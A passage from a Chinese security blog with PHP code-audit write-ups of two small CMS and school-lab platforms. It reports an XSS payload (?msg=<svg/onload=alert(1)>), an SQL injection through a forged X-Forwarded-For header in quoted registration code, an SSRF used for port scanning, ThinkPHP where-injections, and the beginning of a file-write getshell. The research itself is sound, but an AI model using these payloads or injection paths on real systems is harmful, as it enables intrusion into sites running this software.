<h6 id="不是跟你们开玩笑，这作者是真的顶，所以get，post的方法都用了这个函数进行过滤，你用php自带的过滤函数都比他舒服把"><a href="#不是跟你们开玩笑，这作者是真的顶，所以get，post的方法都用了这个函数进行过滤，你用php自带的过滤函数都比他舒服把" class="headerlink" title="不是跟你们开玩笑，这作者是真的顶，所以get，post的方法都用了这个函数进行过滤，你用php自带的过滤函数都比他舒服把"></a>不是跟你们开玩笑，这作者是真的顶，所以get，post的方法都用了这个函数进行过滤，你用php自带的过滤函数都比他舒服把</h6><h4 id="漏洞点1：前台xss"><a href="#漏洞点1：前台xss" class="headerlink" title="漏洞点1：前台xss"></a>漏洞点1：前台xss</h4><h5 id="漏洞文件位于-login-php-作用是提醒用户账号密码错误，虽然使用了flc-request-函数进行过滤，但xss方面只过滤了空格，单引号和script"><a href="#漏洞文件位于-login-php-作用是提醒用户账号密码错误，虽然使用了flc-request-函数进行过滤，但xss方面只过滤了空格，单引号和script" class="headerlink" title="漏洞文件位于/login.php,作用是提醒用户账号密码错误，虽然使用了flc_request()函数进行过滤，但xss方面只过滤了空格，单引号和script"></a>漏洞文件位于/login.php,作用是提醒用户账号密码错误，虽然使用了flc_request()函数进行过滤，但xss方面只过滤了空格，单引号和script</h5><p><img src="https://ae01.alicdn.com/kf/H01d74b7316f14890bdea70b5f1b4a64aP.png"></p>
<h6 id="构造payload-msg-lt-svg-onload-alert-1-gt-进行弹窗"><a href="#构造payload-msg-lt-svg-onload-alert-1-gt-进行弹窗" class="headerlink" title="构造payload: ?msg=&lt;svg/onload=alert(1)&gt; 进行弹窗"></a>构造payload: ?msg=&lt;svg/onload=alert(1)&gt; 进行弹窗</h6><p><img src="https://ae01.alicdn.com/kf/Hea043c113816483a93a39a6f0ab7f8cc3.png"></p>
<h4 id="漏洞点2：前台sql注入"><a href="#漏洞点2：前台sql注入" class="headerlink" title="漏洞点2：前台sql注入"></a>漏洞点2：前台sql注入</h4><h5 id="本来他这样过滤法都基本前台传进来的参数都基本无sql注入了，但在用户注册的-xxx-cms-class-php中，他使用getip来获取用户的ip"><a href="#本来他这样过滤法都基本前台传进来的参数都基本无sql注入了，但在用户注册的-xxx-cms-class-php中，他使用getip来获取用户的ip" class="headerlink" title="本来他这样过滤法都基本前台传进来的参数都基本无sql注入了，但在用户注册的./xxx/cms.class.php中，他使用getip来获取用户的ip"></a>本来他这样过滤法都基本前台传进来的参数都基本无sql注入了，但在用户注册的./xxx/cms.class.php中，他使用getip来获取用户的ip</h5><h6 id="getip-函数的定义，可以看到没有任何过滤"><a href="#getip-函数的定义，可以看到没有任何过滤" class="headerlink" title="getip()函数的定义，可以看到没有任何过滤"></a>getip()函数的定义，可以看到没有任何过滤</h6><p><img src="https://ae01.alicdn.com/kf/H7281ec83c6ad403e812f96c55ef70ab6I.png"></p>
<h6 id="全局搜索使用getuserip函数的文件"><a href="#全局搜索使用getuserip函数的文件" class="headerlink" title="全局搜索使用getuserip函数的文件"></a>全局搜索使用getuserip函数的文件</h6><p><img src="https://ae01.alicdn.com/kf/Ha362a316e95f4125bd04acaba390153eM.png"></p>
<h6 id="有些地方需要审核用户登陆才行，这个要后台进行设置，我们看到注册前台用户出也使用了这个方法，追踪进去看看"><a href="#有些地方需要审核用户登陆才行，这个要后台进行设置，我们看到注册前台用户出也使用了这个方法，追踪进去看看" class="headerlink" title="有些地方需要审核用户登陆才行，这个要后台进行设置，我们看到注册前台用户出也使用了这个方法，追踪进去看看"></a>有些地方需要审核用户登陆才行，这个要后台进行设置，我们看到注册前台用户出也使用了这个方法，追踪进去看看</h6><p><img src="https://ae01.alicdn.com/kf/H4e2a446f86a94efe8b2f6c8c22e45f9dD.png"></p>
<h6 id="追踪注册的regact-php"><a href="#追踪注册的regact-php" class="headerlink" title="追踪注册的regact.php"></a>追踪注册的regact.php</h6><p><img src="https://ae01.alicdn.com/kf/H90f2e19edc0f47d8914fb5abb0582c2eK.png"></p>
<h6 id="可以看到进行了传参，并使用了函数过滤，ip变量是获取ip"><a href="#可以看到进行了传参，并使用了函数过滤，ip变量是获取ip" class="headerlink" title="可以看到进行了传参，并使用了函数过滤，ip变量是获取ip"></a>可以看到进行了传参，并使用了函数过滤，ip变量是获取ip</h6><h6 id="然后执行一系列的逻辑判断，比如用户名和邮箱是否存在，是否验证码正确等逻辑判断落到下面这步"><a href="#然后执行一系列的逻辑判断，比如用户名和邮箱是否存在，是否验证码正确等逻辑判断落到下面这步" class="headerlink" title="然后执行一系列的逻辑判断，比如用户名和邮箱是否存在，是否验证码正确等逻辑判断落到下面这步"></a>然后执行一系列的逻辑判断，比如用户名和邮箱是否存在，是否验证码正确等逻辑判断落到下面这步</h6><img src="https://ae01.alicdn.com/kf/Hee838fc6894046c5b12921b7cdd9692eL.png" style="zoom:200%;" />

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//滑动验证</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;tncode_check&#x27;</span>]!=<span class="string">&#x27;ok&#x27;</span>)&#123;</span><br><span class="line">   <span class="variable">$response_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;status&quot;</span> =&gt; <span class="number">0</span>,<span class="string">&quot;message&quot;</span>  =&gt; <span class="string">&#x27;验证未通过,请重新验证!&#x27;</span>);</span><br><span class="line">   <span class="keyword">echo</span> json_encode(<span class="variable">$response_arr</span>);</span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;tncode_check&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from <span class="subst">&#123;$tablepre&#125;</span>scuser where UserName=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$row</span>   = <span class="variable">$db</span>-&gt;get_row(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>))&#123;</span><br><span class="line">   <span class="variable">$response_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;status&quot;</span> =&gt; <span class="number">0</span>,<span class="string">&quot;message&quot;</span>  =&gt; <span class="string">&#x27;该帐号已经有人使用，请重新注册!&#x27;</span>);</span><br><span class="line">   <span class="keyword">echo</span> json_encode(<span class="variable">$response_arr</span>);</span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$smtpoff</span>==<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$JFM</span>=randomchar(<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="variable">$sql</span>=<span class="string">&quot;insert into <span class="subst">&#123;$tablepre&#125;</span>scuser (UserName,Password,LastLoginIP,LastLoginTime,LoginTimes,JFM) values(&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$ip</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$getnow</span>.<span class="string">&quot;&#x27;,0,&#x27;&quot;</span>.<span class="variable">$JFM</span>.<span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;exec(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//error_log($openssl.&quot;\r\n&quot;, 3, dirname(__FILE__).&#x27;/cht_log.txt&#x27;);</span></span><br><span class="line">	  </span><br><span class="line">      <span class="variable">$mail</span> = <span class="keyword">new</span> PHPMailer(<span class="literal">true</span>);         <span class="comment">//建立邮件发送类</span></span><br><span class="line">      <span class="variable">$mail</span>-&gt;CharSet = <span class="string">&quot;UTF-8&quot;</span>;            <span class="comment">//设置信息的编码类型</span></span><br><span class="line">      <span class="variable">$mail</span>-&gt;IsSMTP();                     <span class="comment">//使用SMTP方式发送</span></span><br><span class="line">      <span class="variable">$mail</span>-&gt;Host = <span class="variable">$smtpserver</span>;           <span class="comment">//使用邮箱服务器</span></span><br><span class="line">      <span class="variable">$mail</span>-&gt;SMTPAuth = <span class="literal">true</span>;              <span class="comment">//启用SMTP验证功能</span></span><br><span class="line">      <span class="variable">$mail</span>-&gt;Username = <span class="variable">$smtpusermail</span>;     <span class="comment">//你的服务器邮箱账号</span></span><br><span class="line">      <span class="variable">$mail</span>-&gt;Password = <span class="variable">$smtppass</span>;         <span class="comment">//邮箱密码</span></span><br><span class="line">	  <span class="keyword">if</span> (<span class="variable">$openssl</span>==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="variable">$mail</span>-&gt;SMTPSecure = <span class="string">&#x27;ssl&#x27;</span>;           <span class="comment">//设置使用ssl加密方式登录鉴权 php.ini开启openssl</span></span><br><span class="line">	  &#125;</span><br><span class="line">      <span class="variable">$mail</span>-&gt;Port = <span class="variable">$smtpport</span>;             <span class="comment">//邮箱服务器端口号</span></span><br><span class="line">      <span class="variable">$mail</span>-&gt;From = <span class="variable">$smtpusermail</span>;         <span class="comment">//邮件发送者email地址</span></span><br><span class="line">      <span class="variable">$mail</span>-&gt;FromName = <span class="variable">$site_name</span>;         <span class="comment">//发件人名称</span></span><br><span class="line">      <span class="variable">$mail</span>-&gt;AddAddress(<span class="variable">$username</span>);        <span class="comment">//发送多人就写多行，显示为陈惠添(chenhuitian@septwolves.com)</span></span><br><span class="line">      <span class="variable">$mail</span>-&gt;IsHTML(<span class="literal">true</span>);                 <span class="comment">//是否使用HTML格式</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$mail</span>-&gt;Subject = <span class="variable">$site_name</span>.<span class="string">&quot;新用户确认通知&quot;</span>;; <span class="comment">//邮件标题</span></span><br><span class="line"></span><br><span class="line">	  <span class="variable">$mailbody</span> = <span class="string">&quot;亲爱的&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;,离成功注册&quot;</span>.<span class="variable">$site_name</span>.<span class="string">&quot;就差一步了！&lt;br&gt;&lt;br&gt;请点击以下链接完成注册：&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="variable">$mailbody</span> = <span class="variable">$mailbody</span>.<span class="string">&#x27;&lt;a href=&quot;&#x27;</span>.<span class="variable">$site_url</span>.<span class="string">&#x27;/activeuser.php?username=&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&amp;pwd=&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;&amp;JFM=&#x27;</span>.<span class="variable">$JFM</span>.<span class="string">&#x27;&quot;  target=&quot;_blank&quot;&gt;&#x27;</span>.<span class="variable">$site_url</span>.<span class="string">&#x27;/activeuser.php?username=&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&amp;pwd=&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;&lt;/a&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$mail</span>-&gt;Body = <span class="variable">$mailbody</span>; <span class="comment">//邮件内容，上面设置HTML，则可以是HTML</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$mail</span>-&gt;Send())&#123;</span><br><span class="line">		 <span class="variable">$response_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;status&quot;</span> =&gt; <span class="number">1</span>,<span class="string">&quot;message&quot;</span>  =&gt; <span class="string">&#x27;注册资料已提交成功,请登录邮箱激活你的帐户!&#x27;</span>);</span><br><span class="line">         <span class="keyword">echo</span> json_encode(<span class="variable">$response_arr</span>);</span><br><span class="line">         <span class="keyword">exit</span>;</span><br><span class="line">	  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 <span class="variable">$response_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;status&quot;</span> =&gt; <span class="number">0</span>,<span class="string">&quot;message&quot;</span>  =&gt; <span class="string">&#x27;邮件服务器异常,帐号可能无法激活,请联系网站管理员!&#x27;</span>);</span><br><span class="line">         <span class="keyword">echo</span> json_encode(<span class="variable">$response_arr</span>);</span><br><span class="line">         <span class="keyword">exit</span>;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;insert into <span class="subst">&#123;$tablepre&#125;</span>scuser (UserName,Password,LastLoginIP,LastLoginTime,LoginTimes,AdminType,isCheck) values(&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$ip</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$getnow</span>.<span class="string">&quot;&#x27;,0,0,1)&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;exec(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$uid</span>=<span class="variable">$db</span>-&gt;lastInsertId2();</span><br><span class="line"></span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&quot;uid&quot;</span>]=<span class="variable">$uid</span>;</span><br><span class="line">	  <span class="variable">$_SESSION</span>[<span class="string">&quot;UserName&quot;</span>]=<span class="variable">$username</span>;</span><br><span class="line">	  <span class="variable">$_SESSION</span>[<span class="string">&quot;pwd&quot;</span>]=<span class="variable">$password</span>;</span><br><span class="line">	  <span class="variable">$response_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;status&quot;</span> =&gt; <span class="number">2</span>,<span class="string">&quot;message&quot;</span>  =&gt; <span class="string">&#x27;注册资料已提交成功,点击确定登录你后台!&#x27;</span>);</span><br><span class="line">      <span class="keyword">echo</span> json_encode(<span class="variable">$response_arr</span>);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id=""><a href="#" class="headerlink" title=""></a></h6><h6 id="getuserip是无过滤的，最后使用insert来执行sql语句，XFF头是可以伪造的，所以造成sql注入"><a href="#getuserip是无过滤的，最后使用insert来执行sql语句，XFF头是可以伪造的，所以造成sql注入" class="headerlink" title="getuserip是无过滤的，最后使用insert来执行sql语句，XFF头是可以伪造的，所以造成sql注入"></a>getuserip是无过滤的，最后使用insert来执行sql语句，XFF头是可以伪造的，所以造成sql注入</h6><p><img src="https://ae01.alicdn.com/kf/H8dd33a6807da483fb3a7f8b6d12e2a9bL.png"></p>
<img src="https://ae01.alicdn.com/kf/H7ec3527f1d08438b8de6596b65205c6d0.png" style="zoom:200%;" />

<img src="https://ae01.alicdn.com/kf/Ha43a15c7842c4e8cb7fed32896844264Y.png" style="zoom:200%;" />



<h4 id="其他可疑点："><a href="#其他可疑点：" class="headerlink" title="其他可疑点："></a>其他可疑点：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">creat_file</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$name</span></span>)</span>&#123;<span class="comment">//建立文件</span></span><br><span class="line">     <span class="variable">$filename</span>=<span class="variable">$path</span>.<span class="variable">$name</span>;</span><br><span class="line">     <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件已经存在，请换个文件名&quot;</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$path</span>))&#123;</span><br><span class="line">           touch(<span class="variable">$name</span>);</span><br><span class="line">           rename(<span class="variable">$name</span>,<span class="variable">$filename</span>);</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;文件建立成功 &lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;目录不存在，请检查&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 本方法用来写文件，向$path路径下$name文件写入$content内容，$bool为写入选项，值为1时</span></span><br><span class="line"><span class="comment">   * 接着文件原内容下继续写入，值为2时写入后的文件只有本次$content内容</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string_type $path</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string_type $name</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string_type $content</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> $bool_type $bool</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">write_file</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$name</span>,<span class="variable">$content</span>,<span class="variable">$bool</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$path</span>.<span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$bool</span>==<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (is_writable(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">       <span class="variable">$handle</span>=fopen(<span class="variable">$filename</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">       <span class="keyword">if</span> (!<span class="variable">$handle</span>) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;文件不能打开或文件不存在&quot;</span>;</span><br><span class="line">          <span class="keyword">exit</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$result</span>=fwrite(<span class="variable">$handle</span>,<span class="variable">$content</span>);</span><br><span class="line">       <span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;文件写入失败&quot;</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;文件写入成功&quot;</span>;</span><br><span class="line">          fclose(<span class="variable">$handle</span>);</span><br><span class="line">	   &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	   <span class="keyword">echo</span> <span class="string">&quot;文件不存在&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$bool</span>==<span class="number">2</span>) &#123;</span><br><span class="line">       <span class="keyword">if</span> (!file_exists(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;creat_file(<span class="variable">$path</span>,<span class="variable">$name</span>);</span><br><span class="line">          <span class="variable">$handle</span>=fopen(<span class="variable">$filename</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">          <span class="keyword">if</span> (fwrite(<span class="variable">$handle</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">&quot;文件写入成功&quot;</span>;</span><br><span class="line">		  &#125;</span><br><span class="line">       &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">          unlink(<span class="variable">$filename</span>);</span><br><span class="line">          <span class="keyword">$this</span>-&gt;creat_file(<span class="variable">$path</span>,<span class="variable">$name</span>);</span><br><span class="line">          <span class="keyword">$this</span>-&gt;write_file(<span class="variable">$path</span>,<span class="variable">$name</span>,<span class="variable">$content</span>,<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;文件修改成功&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="但没有调用这两个函数的地方-那你tm写出来干嘛？？？-后台的洞，有时间在审计，先撤了"><a href="#但没有调用这两个函数的地方-那你tm写出来干嘛？？？-后台的洞，有时间在审计，先撤了" class="headerlink" title="但没有调用这两个函数的地方  (那你tm写出来干嘛？？？),后台的洞，有时间在审计，先撤了"></a>但没有调用这两个函数的地方  (那你tm写出来干嘛？？？),后台的洞，有时间在审计，先撤了</h5>]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>JFweb审计</title>
    <url>/2022/02/09/JFweb%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="JFweb审计"><a href="#JFweb审计" class="headerlink" title="JFweb审计"></a>JFweb审计</h2><p>author:7_up</p>
<h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><h6 id="基于opensns进行二次开发的中小学生信息技术学科平台-jfweb-（-开发语言为PHP5-6，基于opensns2-82（现向6-0过渡，前台仍采用Zui框架为主）基础上的二次开发系统，是水月居工作室开发的开源学生机房管理平台，可免费使用，但不授权商业使用。集成学生信息技术学科平台、学生作业管理、学生课程管理等相关功能于一体的多功能教学平台，主要应用于信息技术课堂教学中。-源码发内部群文件"><a href="#基于opensns进行二次开发的中小学生信息技术学科平台-jfweb-（-开发语言为PHP5-6，基于opensns2-82（现向6-0过渡，前台仍采用Zui框架为主）基础上的二次开发系统，是水月居工作室开发的开源学生机房管理平台，可免费使用，但不授权商业使用。集成学生信息技术学科平台、学生作业管理、学生课程管理等相关功能于一体的多功能教学平台，主要应用于信息技术课堂教学中。-源码发内部群文件" class="headerlink" title="基于opensns进行二次开发的中小学生信息技术学科平台 jfweb （ 开发语言为PHP5.6，基于opensns2.82（现向6.0过渡，前台仍采用Zui框架为主）基础上的二次开发系统，是水月居工作室开发的开源学生机房管理平台，可免费使用，但不授权商业使用。集成学生信息技术学科平台、学生作业管理、学生课程管理等相关功能于一体的多功能教学平台，主要应用于信息技术课堂教学中。(源码发内部群文件)"></a>基于opensns进行二次开发的中小学生信息技术学科平台 jfweb （ 开发语言为PHP5.6，基于opensns2.82（现向6.0过渡，前台仍采用Zui框架为主）基础上的二次开发系统，是水月居工作室开发的开源学生机房管理平台，可免费使用，但不授权商业使用。集成学生信息技术学科平台、学生作业管理、学生课程管理等相关功能于一体的多功能教学平台，主要应用于信息技术课堂教学中。(源码发内部群文件)</h6><h5 id="软件架构"><a href="#软件架构" class="headerlink" title="软件架构"></a>软件架构</h5><h6 id="软件架构说明：ZUI1-8-1-THINKPHP3-2-3-JQUERY-PHPexcel1-8-PHPword1-2"><a href="#软件架构说明：ZUI1-8-1-THINKPHP3-2-3-JQUERY-PHPexcel1-8-PHPword1-2" class="headerlink" title="软件架构说明：ZUI1.8.1+THINKPHP3.2.3+JQUERY+PHPexcel1.8+PHPword1.2"></a>软件架构说明：ZUI1.8.1+THINKPHP3.2.3+JQUERY+PHPexcel1.8+PHPword1.2</h6><h6 id="该系统是由Thinkphp框架构成的，也不难审计，感觉挺简单的，无聊审计一下-发一下思路，大cms我真审计不了"><a href="#该系统是由Thinkphp框架构成的，也不难审计，感觉挺简单的，无聊审计一下-发一下思路，大cms我真审计不了" class="headerlink" title="该系统是由Thinkphp框架构成的，也不难审计，感觉挺简单的，无聊审计一下,发一下思路，大cms我真审计不了"></a>该系统是由Thinkphp框架构成的，也不难审计，感觉挺简单的，无聊审计一下,发一下思路，大cms我真审计不了</h6><p><img src="https://ae01.alicdn.com/kf/H75f170c521bc4a0e8f76b5f268839e346.png"></p>
<h6 id="大致目录结构如下"><a href="#大致目录结构如下" class="headerlink" title="大致目录结构如下:"></a>大致目录结构如下:</h6><p><img src="https://ae01.alicdn.com/kf/Hba96a4aa661e4ee0b616f6fe40ce8fe1k.png"></p>
<h5 id="漏洞1：前台SSRF"><a href="#漏洞1：前台SSRF" class="headerlink" title="漏洞1：前台SSRF"></a>漏洞1：前台SSRF</h5><h6 id="漏洞文件位于-Public-js-php-下"><a href="#漏洞文件位于-Public-js-php-下" class="headerlink" title="漏洞文件位于 /Public/js.php 下"></a>漏洞文件位于 /Public/js.php 下</h6><p><img src="https://ae01.alicdn.com/kf/H0a025332d7774d87b7aff64ba5f16463s.png"></p>
<h6 id="先定义一个gettype参数为js并用数组定义参数allowed-content-types-然后GET参数赋值给getfiles变量，这里这个getfiles变量可控，咋们往下看"><a href="#先定义一个gettype参数为js并用数组定义参数allowed-content-types-然后GET参数赋值给getfiles变量，这里这个getfiles变量可控，咋们往下看" class="headerlink" title="先定义一个gettype参数为js并用数组定义参数allowed_content_types,然后GET参数赋值给getfiles变量，这里这个getfiles变量可控，咋们往下看"></a>先定义一个gettype参数为js并用数组定义参数allowed_content_types,然后GET参数赋值给getfiles变量，这里这个getfiles变量可控，咋们往下看</h6><img src="https://ae01.alicdn.com/kf/Hcb5374b9c42c4182af1b7583bf9e8296q.png" style="zoom:200%;" />

<h6 id="截取后缀名赋值给fileType变量，然后进行if判断这个fileType的值是否在数组allowed-content-types变量中，存在则用readfile函数读取file参数，造成ssrf-这里后缀名限制死了，不如能任意文件读取"><a href="#截取后缀名赋值给fileType变量，然后进行if判断这个fileType的值是否在数组allowed-content-types变量中，存在则用readfile函数读取file参数，造成ssrf-这里后缀名限制死了，不如能任意文件读取" class="headerlink" title="截取后缀名赋值给fileType变量，然后进行if判断这个fileType的值是否在数组allowed_content_types变量中，存在则用readfile函数读取file参数，造成ssrf(这里后缀名限制死了，不如能任意文件读取)"></a>截取后缀名赋值给fileType变量，然后进行if判断这个fileType的值是否在数组allowed_content_types变量中，存在则用readfile函数读取file参数，造成ssrf(这里后缀名限制死了，不如能任意文件读取)</h6><h6 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h6><img src="https://ae01.alicdn.com/kf/Hb37755d5de954ac0a6562db5e0e35d55j.png" style="zoom:200%;" />

<h6 id="扫描端口，不开放则延迟两秒，以此来判断"><a href="#扫描端口，不开放则延迟两秒，以此来判断" class="headerlink" title="扫描端口，不开放则延迟两秒，以此来判断"></a>扫描端口，不开放则延迟两秒，以此来判断</h6><p><img src="https://ae01.alicdn.com/kf/Hce671aafe51845e7a79cf0402204de213.png"></p>
<p><img src="https://ae01.alicdn.com/kf/Hb79edb5a42a2496da9c9874b262dcc403.png"></p>
<h5 id="漏洞2：sql注入"><a href="#漏洞2：sql注入" class="headerlink" title="漏洞2：sql注入"></a>漏洞2：sql注入</h5><h6 id="问题文件出现在-Admin-Controller-ExpressionController-class-php"><a href="#问题文件出现在-Admin-Controller-ExpressionController-class-php" class="headerlink" title="问题文件出现在 /Admin/Controller/ExpressionController.class.php"></a>问题文件出现在 /Admin/Controller/ExpressionController.class.php</h6><img src="https://ae01.alicdn.com/kf/H97eec5f51c224c22b3a19f8ac6d950b8T.png" style="zoom:200%;" />

<h6 id="这个方法用get获取name和pkg参数后-赋值给pathname进行sql查询，这里用到的框架是tp3，where注入，老生常谈了，不在讲诉"><a href="#这个方法用get获取name和pkg参数后-赋值给pathname进行sql查询，这里用到的框架是tp3，where注入，老生常谈了，不在讲诉" class="headerlink" title="这个方法用get获取name和pkg参数后,赋值给pathname进行sql查询，这里用到的框架是tp3，where注入，老生常谈了，不在讲诉"></a>这个方法用get获取name和pkg参数后,赋值给pathname进行sql查询，这里用到的框架是tp3，where注入，老生常谈了，不在讲诉</h6><img src="https://ae01.alicdn.com/kf/H417653cfaafa4ba291e831eaa37136ecz.png" style="zoom:200%;" />

<img src="https://ae01.alicdn.com/kf/H9f5d7974951e42ac85dc2184a9c3ea70B.png" style="zoom:200%;" />

<img src="https://ae01.alicdn.com/kf/H6696cf8eb82f4aacbb823b563e6a8a88T.png" style="zoom:200%;" />

<h6 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h6><h6 id="Application-Exam-Controller-IndexController-class-php-也用到where注入，自己审计下"><a href="#Application-Exam-Controller-IndexController-class-php-也用到where注入，自己审计下" class="headerlink" title="/Application/Exam/Controller/IndexController.class.php 也用到where注入，自己审计下"></a>/Application/Exam/Controller/IndexController.class.php 也用到where注入，自己审计下</h6><h5 id="漏洞3：后台任意文件写入getshell"><a href="#漏洞3：后台任意文件写入getshell" class="headerlink" title="漏洞3：后台任意文件写入getshell"></a>漏洞3：后台任意文件写入getshell</h5><h6 id="问题出现在后台创建插件处"><a href="#问题出现在后台创建插件处" class="headerlink" title="问题出现在后台创建插件处"></a>问题出现在后台创建插件处</h6><p><img src="https://ae01.alicdn.com/kf/Hc890df0d861047aaad96edf6cb358670D.png"></p>
<h6 id="根据路由定位到漏洞源码：-Admin-Controller-AddonsController-class-php"><a href="#根据路由定位到漏洞源码：-Admin-Controller-AddonsController-class-php" class="headerlink" title="根据路由定位到漏洞源码： /Admin/Controller/AddonsController.class.php"></a>根据路由定位到漏洞源码： /Admin/Controller/AddonsController.class.php</h6><img src="https://ae01.alicdn.com/kf/Haaf85fb4ed2c4f5a9a328e5f33cb1955n.png" style="zoom:200%;" />

